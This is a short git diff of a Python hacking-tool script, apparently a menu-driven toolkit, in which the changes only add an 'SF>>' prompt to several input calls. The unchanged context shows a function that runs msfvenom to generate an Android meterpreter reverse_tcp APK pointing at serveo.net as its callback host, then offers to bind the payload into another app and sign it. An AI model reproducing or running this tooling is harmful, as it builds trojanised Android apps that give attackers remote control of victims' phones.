@@ -93,7 +93,7 @@ def install():
               
               
 ins = input('''Do you want to install all required dependencies and packages? This will also install additional packages so you can install \n any tool without errors ^w^ y/n
-Run Only Once! ''') 
+Run Only Once! \n SF>>  ''') 
 if ins.lower() == 'y':
     install()
 os.system("clear") 
@@ -166,7 +166,7 @@ print('''
          
 def generateandroidpayload():
     os.system("cd $HOME")
-    x = input("Please enter The Port Number To be Used or enter a random number b/w 1024-65535: ")
+    x = input("Please enter The Port Number To be Used or enter a random number b/w 1024-65535: \n SF>> ")
     print("Payload is generating please be patient [*]")
     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=" + x + " -o $HOME/downloads/androidpayload.apk")
     prGreen ("The bare payload has been saved as $HOME/downloads/androidpayload.apk")
@@ -176,7 +176,7 @@ def generateandroidpayload():
            [2] Sign payload
            [3] Bind and Sign
            [4] None. exit application''')
-    q1 = input()
+    q1 = input("SF>> ")
     if q1 == '1':
         q2 = input("Please enter path of apk you want to bind to: ")
         prLightPurple("Binding....Please be Patient[*]")
